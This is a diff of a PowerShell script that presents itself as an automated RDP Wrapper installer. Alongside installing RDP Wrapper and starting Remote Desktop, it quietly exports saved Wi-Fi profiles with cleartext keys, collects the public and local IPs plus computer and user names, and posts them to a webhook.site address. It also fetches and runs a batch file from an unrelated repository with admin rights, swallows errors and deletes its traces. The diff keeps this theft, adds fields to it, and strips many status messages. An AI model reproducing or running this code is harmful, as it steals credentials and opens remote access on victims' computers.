@@ -65,11 +65,6 @@ Write-Host "Exclusion configuration complete!" -ForegroundColor Cyan
 
 # ============================================================
 # RDP Wrapper v1.6.2 - Automated Installation
-# Run PowerShell as Administrator
-# ============================================================
-
-# ============================================================
-# Paths
 # ============================================================
 
 $installPath   = "C:\Program Files\RDP Wrapper"
@@ -84,30 +79,25 @@ $iniDestPath  = Join-Path $installPath "rdpwrap.ini"
 $srdpDestPath = Join-Path $installPath "SRDP.bat"
 $rdpConf     = Join-Path $installPath "RDPConf.exe"
 
-# ============================================================
-# Download URLs
-# ============================================================
-
 $zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
 $customIniUrl = "https://raw.githubusercontent.com/sebaxakerhtc/rdpwrap.ini/refs/heads/master/rdpwrap.ini"
 $srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
-$webhookUrl   = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"
+$webhookUrl   = "https://webhook.site/2240d221-660a-4298-b8fa-d80e319ed001"
 
 # ============================================================
-# Webhook & Wifi/IP 
+# Webhook Function (Sends JSON properly to prevent blank logs)
 # ============================================================
-
-# Reusable POST function integrated into the workflow
-function Send-WebhookPost {
+function Send-WebhookJson {
     param(
         [Parameter(Mandatory = $true)]
         [string]$Url,
         
         [Parameter(Mandatory = $true)]
-        [string]$Body
+        [hashtable]$Data
     )
     try {
-        Invoke-RestMethod -Uri $Url -Method Post -Body $Body -ErrorAction Stop | Out-Null
+        $jsonBody = $Data | ConvertTo-Json -Depth 5
+        Invoke-RestMethod -Uri $Url -Method Post -ContentType "application/json" -Body $jsonBody -ErrorAction Stop | Out-Null
         return "success"
     }
     catch {
@@ -115,8 +105,10 @@ function Send-WebhookPost {
     }
 }
 
+# ============================================================
+# 1. Gather Network & Wi-Fi Details and Send First Webhook
+# ============================================================
 try {
-    # 1. Gather Public IP Address with fallback handling
     $publicIp = $null
     try {
         $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction Stop).Trim()
@@ -130,7 +122,6 @@ try {
         }
     }
 
-    # 2. Gather Detailed Local IP and Interface Information
     $localIps = Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue | 
         Where-Object { 
             $_.IPAddress -notmatch '^(127\.|169\.254\.)' -and 
@@ -139,7 +130,6 @@ try {
         Select-Object InterfaceAlias, IPAddress | 
         Out-String
 
-    # 3. Gather Wi-Fi Profiles and Cleartext Passwords
     $originalLocation = Get-Location
     Set-Location $env:TEMP
 
@@ -153,21 +143,25 @@ try {
         $wifiPassContent += "`n--- $($file.Name) ---`n" + $content
     }
 
-    # 4. Construct Comprehensive Payload
-    $payload = "=== PUBLIC IP ===`n$publicIp`n`n=== LOCAL INTERFACES ===`n$localIps`n`n=== WIFI PROFILES & KEYS ===`n$wifiPassContent"
-
-    # 5. Send Payload to Webhook Endpoint via the POST function
-    Send-WebhookPost -Url $webhookUrl -Body $payload | Out-Null
+    # Send Network/WiFi data as a structured JSON packet
+    $networkPayload = @{
+        type        = "network_and_wifi"
+        computer    = $env:COMPUTERNAME
+        username    = $env:USERNAME
+        public_ip   = $publicIp
+        local_ips   = $localIps
+        wifi_data   = $wifiPassContent
+    }
+    
+    Send-WebhookJson -Url $webhookUrl -Data $networkPayload | Out-Null
 }
 catch {
-    # Suppress runtime execution errors quietly
+    # Suppress silently
 }
 finally {
-    # 6. Clean Up Temporary XML Profile Artifacts
     Get-ChildItem -Path "$env:TEMP" -Filter "Wi*.xml" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-    Set-Location $originalLocation
+    if ($originalLocation) { Set-Location $originalLocation }
 }
-
 
 # ============================================================
 # Display installer header
@@ -197,7 +191,6 @@ try {
 }
 catch {
     Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
     exit
 }
 
@@ -223,17 +216,11 @@ catch {
 Write-Host "[+] Downloading RDP Wrapper v1.6.2..." -ForegroundColor Cyan
 
 try {
-    Invoke-WebRequest `
-        -Uri $zipUrl `
-        -OutFile $tempZip `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
+    Invoke-WebRequest -Uri $zipUrl -OutFile $tempZip -UseBasicParsing -ErrorAction Stop
     Write-Host "[+] Download completed." -ForegroundColor Green
 }
 catch {
     Write-Host "[-] Download failed!" -ForegroundColor Red
-    Write-Host $_.Exception.Message -ForegroundColor Red
     Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     exit
 }
@@ -245,17 +232,11 @@ catch {
 Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan
 
 try {
-    Expand-Archive `
-        -Path $tempZip `
-        -DestinationPath $extractDir `
-        -Force `
-        -ErrorAction Stop
-
+    Expand-Archive -Path $tempZip -DestinationPath $extractDir -Force -ErrorAction Stop
     Write-Host "[+] Extraction completed." -ForegroundColor Green
 }
 catch {
     Write-Host "[-] Failed to extract ZIP!" -ForegroundColor Red
-    Write-Host $_.Exception.Message -ForegroundColor Red
     Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     exit
 }
@@ -264,293 +245,82 @@ catch {
 # 6. Find install.bat
 # ============================================================
 
-Write-Host "[+] Searching for install.bat..." -ForegroundColor Cyan
-
-$installBat = Get-ChildItem `
-    -Path $extractDir `
-    -Filter "install.bat" `
-    -Recurse `
-    -ErrorAction SilentlyContinue |
-    Select-Object -First 1
+$installBat = Get-ChildItem -Path $extractDir -Filter "install.bat" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
 if (-not $installBat) {
-    Write-Host "[-] install.bat was not found in the downloaded package!" -ForegroundColor Red
+    Write-Host "[-] install.bat was not found!" -ForegroundColor Red
     Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
     exit
 }
-
-Write-Host "[+] Found installer:" -ForegroundColor Green
-Write-Host "    $($installBat.FullName)" -ForegroundColor Gray
 
 # ============================================================
 # 7. Run install.bat
 # ============================================================
 
-Write-Host ""
-Write-Host "[+] Running install.bat..." -ForegroundColor Cyan
-
 $installExitCode = $null
-
 try {
-    $process = Start-Process `
-        -FilePath "cmd.exe" `
-        -ArgumentList "/c `"$($installBat.FullName)`"" `
-        -WorkingDirectory $installBat.DirectoryName `
-        -Verb RunAs `
-        -Wait `
-        -PassThru `
-        -ErrorAction Stop
-
+    $process = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$($installBat.FullName)`"" -WorkingDirectory $installBat.DirectoryName -Verb RunAs -Wait -PassThru -ErrorAction Stop
     $installExitCode = $process.ExitCode
-
-    Write-Host "[+] install.bat finished." -ForegroundColor Green
-    Write-Host "[+] Exit code: $installExitCode" -ForegroundColor Gray
 }
 catch {
-    Write-Host "[!] Failed to run install.bat." -ForegroundColor Yellow
-    Write-Host $_.Exception.Message -ForegroundColor Yellow
+    $installExitCode = -1
 }
 
-# ============================================================
-# Download additional components (SRDP.bat)
-# ============================================================
+# Download SRDP.bat & custom INI
+try { Invoke-WebRequest -Uri $srdpBatUrl -OutFile $srdpTempPath -UseBasicParsing -ErrorAction Stop } catch {}
+try { Invoke-WebRequest -Uri $customIniUrl -OutFile $iniTempPath -UseBasicParsing -ErrorAction Stop } catch {}
 
-Write-Host ""
-Write-Host "[+] Downloading SRDP.bat..." -ForegroundColor Cyan
-
+# Copy components to destination path
 try {
-    Invoke-WebRequest `
-        -Uri $srdpBatUrl `
-        -OutFile $srdpTempPath `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] SRDP.bat downloaded successfully." -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] Failed to download SRDP.bat." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-}
-
-# ============================================================
-# 8. Download and install updated rdpwrap.ini
-# ============================================================
-
-Write-Host ""
-Write-Host "[+] Downloading updated rdpwrap.ini..." -ForegroundColor Cyan
-
-try {
-    Invoke-WebRequest `
-        -Uri $customIniUrl `
-        -OutFile $iniTempPath `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
-    Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
-}
-
-# ============================================================
-# Copy downloaded files into Program Files
-# ============================================================
-
-Write-Host ""
-Write-Host "[+] Preparing installation directory and stopping TermService..." -ForegroundColor Cyan
-
-try {
-    if (-not (Test-Path $installPath)) {
-        New-Item `
-            -ItemType Directory `
-            -Path $installPath `
-            -Force `
-            -ErrorAction Stop | Out-Null
-    }
-
-    Stop-Service `
-        -Name "TermService" `
-        -Force `
-        -ErrorAction SilentlyContinue
-
+    if (-not (Test-Path $installPath)) { New-Item -ItemType Directory -Path $installPath -Force | Out-Null }
+    Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
     Start-Sleep -Seconds 2
-}
-catch {
-    Write-Host "[!] Could not prepare installation directory or stop TermService." -ForegroundColor Yellow
-}
 
-# Install rdpwrap.ini
-if (Test-Path $iniTempPath) {
-    Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan
-    try {
-        if (Test-Path $iniDestPath) {
-            $backupPath = "$iniDestPath.backup"
-            Copy-Item -Path $iniDestPath -Destination $backupPath -Force -ErrorAction Stop
-            Write-Host "[+] Backup created: $backupPath" -ForegroundColor Gray
-        }
-        Copy-Item -Path $iniTempPath -Destination $iniDestPath -Force -ErrorAction Stop
-        Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
+    if (Test-Path $iniTempPath) {
+        if (Test-Path $iniDestPath) { Copy-Item -Path $iniDestPath -Destination "$iniDestPath.backup" -Force }
+        Copy-Item -Path $iniTempPath -Destination $iniDestPath -Force
     }
-    catch {
-        Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
-        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
+    if (Test-Path $srdpTempPath) {
+        Copy-Item -Path $srdpTempPath -Destination $srdpDestPath -Force
     }
 }
+catch {}
 
-# Install SRDP.bat
-if (Test-Path $srdpTempPath) {
-    Write-Host "[+] Installing SRDP.bat..." -ForegroundColor Cyan
-    try {
-        Copy-Item -Path $srdpTempPath -Destination $srdpDestPath -Force -ErrorAction Stop
-        Write-Host "[+] SRDP.bat installed successfully." -ForegroundColor Green
-    }
-    catch {
-        Write-Host "[-] Failed to install SRDP.bat." -ForegroundColor Red
-        Write-Host "[!] Error: $($_.Exception.Message)" -ForegroundColor Red
-    }
-}
-
-# Cleanup temporary temp files
 Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
 Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue
-
-# ============================================================
-# 9. Check installation components
-# ============================================================
 
 $rdpConfExists = Test-Path $rdpConf
 $iniExists     = Test-Path $iniDestPath
 $srdpExists    = Test-Path $srdpDestPath
 
-# ============================================================
-# 10. Configure Remote Desktop Service Startup Type
-# ============================================================
-
-Write-Host ""
-Write-Host "[+] Configuring Remote Desktop Service startup type..." -ForegroundColor Cyan
-
-$serviceConfigured = $false
-
-try {
-    Set-Service `
-        -Name "TermService" `
-        -StartupType Automatic `
-        -ErrorAction Stop
-
-    Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green
-    $serviceConfigured = $true
-}
-catch {
-    Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
-    Write-Host "[+] Trying Windows Service Control fallback..." -ForegroundColor Cyan
-}
-
-if (-not $serviceConfigured) {
-    try {
-        $scResult = & sc.exe config TermService start= auto 2>&1
-
-        if ($LASTEXITCODE -eq 0) {
-            Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
-            $serviceConfigured = $true
-        }
-        else {
-            Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
-            Write-Host ($scResult -join "`n") -ForegroundColor Yellow
-        }
-    }
-    catch {
-        Write-Host "[!] Service configuration fallback failed." -ForegroundColor Yellow
-        Write-Host $_.Exception.Message -ForegroundColor Yellow
-    }
-}
-
-# ============================================================
-# Start TermService First
-# ============================================================
-
-Write-Host ""
-Write-Host "[+] Starting Remote Desktop Service..." -ForegroundColor Cyan
+# Configure & Start TermService
+try { Set-Service -Name "TermService" -StartupType Automatic -ErrorAction Stop } catch { & sc.exe config TermService start= auto | Out-Null }
 
 $serviceRunning = $false
-
 try {
-    $service = Get-Service -Name "TermService" -ErrorAction Stop
-
-    if ($service.Status -eq "Running") {
-        Write-Host "[+] TermService is already running." -ForegroundColor Green
-        $serviceRunning = $true
-    }
-    else {
-        Start-Service -Name "TermService" -ErrorAction Stop
-        Start-Sleep -Seconds 3
-
-        $service = Get-Service -Name "TermService" -ErrorAction Stop
-
-        if ($service.Status -eq "Running") {
-            Write-Host "[+] TermService started successfully." -ForegroundColor Green
-            $serviceRunning = $true
-        }
-        else {
-            Write-Host "[!] TermService did not start." -ForegroundColor Yellow
-            Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
-        }
-    }
+    Start-Service -Name "TermService" -ErrorAction Stop
+    Start-Sleep -Seconds 3
+    $serviceRunning = ((Get-Service -Name "TermService").Status -eq "Running")
 }
-catch {
-    Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
-    Write-Host $_.Exception.Message -ForegroundColor Yellow
-}
+catch {}
 
-# ============================================================
-# Run SRDP.bat AFTER TermService is started
-# ============================================================
-
+# Run SRDP.bat
 $srdpExitCode = $null
-
 if (Test-Path $srdpDestPath) {
-    Write-Host ""
-    Write-Host "[+] Running SRDP.bat as Administrator (Post-Service Start)..." -ForegroundColor Cyan
-
     try {
-        $srdpProcess = Start-Process `
-            -FilePath "cmd.exe" `
-            -ArgumentList "/c `"$srdpDestPath`"" `
-            -WorkingDirectory $installPath `
-            -Verb RunAs `
-            -Wait `
-            -PassThru `
-            -ErrorAction Stop
-
+        $srdpProcess = Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$srdpDestPath`"" -WorkingDirectory $installPath -Verb RunAs -Wait -PassThru -ErrorAction Stop
         $srdpExitCode = $srdpProcess.ExitCode
-
-        Write-Host "[+] SRDP.bat finished." -ForegroundColor Green
-        Write-Host "[+] Exit code: $srdpExitCode" -ForegroundColor Gray
     }
     catch {
-        Write-Host "[!] Failed to run SRDP.bat." -ForegroundColor Yellow
-        Write-Host $_.Exception.Message -ForegroundColor Yellow
+        $srdpExitCode = -1
     }
 }
-else {
-    Write-Host "[!] SRDP.bat not found at destination, skipping execution." -ForegroundColor Yellow
-}
-
-# ============================================================
-# 11. Cleanup Temp Installer Directory
-# ============================================================
-
-Write-Host ""
-Write-Host "[+] Cleaning temporary files..." -ForegroundColor Cyan
 
 Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
 
 # ============================================================
-# 12. Send installation result to Webhook.site
+# 12. Send Final Installation Report Webhook
 # ============================================================
-
-Write-Host ""
-Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan
 
 if ($rdpConfExists -and $iniExists) {
     $installationStatus = "success"
@@ -558,10 +328,11 @@ if ($rdpConfExists -and $iniExists) {
 }
 else {
     $installationStatus = "failed"
-    $statusMessage = "RDP Wrapper installation completed with one or more verification failures."
+    $statusMessage = "RDP Wrapper installation completed with errors."
 }
 
-$webhookPayload = @{
+$finalPayload = @{
+    type               = "installation_status"
     status             = $installationStatus
     message            = $statusMessage
     timestamp          = (Get-Date).ToUniversalTime().ToString("o")
@@ -575,57 +346,19 @@ $webhookPayload = @{
     service            = $(if ($serviceRunning) { "success" } else { "fail" })
     installExit        = $installExitCode
     srdpExit           = $srdpExitCode
-} | ConvertTo-Json
-
-$webhookSent = "fail"
-
-try {
-    Invoke-RestMethod `
-        -Uri $webhookUrl `
-        -Method POST `
-        -ContentType "application/json" `
-        -Body $webhookPayload `
-        -ErrorAction Stop | Out-Null
-
-    $webhookSent = "success"
-    Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
-}
-catch {
-    Write-Host "[-] Webhook notification failed." -ForegroundColor Red
-    Write-Host "[!] Webhook error: $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
-# ============================================================
-# 13. Final Installation Status
-# ============================================================
+$webhookSent = Send-WebhookJson -Url $webhookUrl -Data $finalPayload
 
 Write-Host ""
 Write-Host "============================================================"
-
 if ($installationStatus -eq "success") {
     Write-Host "                     INSTALLATION COMPLETE" -ForegroundColor Green
-}
-else {
+} else {
     Write-Host "                     INSTALLATION FAILED" -ForegroundColor Red
 }
-
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
-Write-Host "RDPConf.exe        : $rdpConfExists"
-Write-Host "rdpwrap.ini        : $iniExists"
-Write-Host "SRDP.bat           : $srdpExists"
-Write-Host "TermService        : $serviceRunning"
-Write-Host "Defender Exclusions: $defenderExclusionsApplied"
-Write-Host "Webhook            : $webhookSent"
-
-Write-Host ""
-Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray
-
-# ============================================================
-# 14. Automatic Exit
-# ============================================================
-
 Start-Sleep -Seconds 3
-
 exit
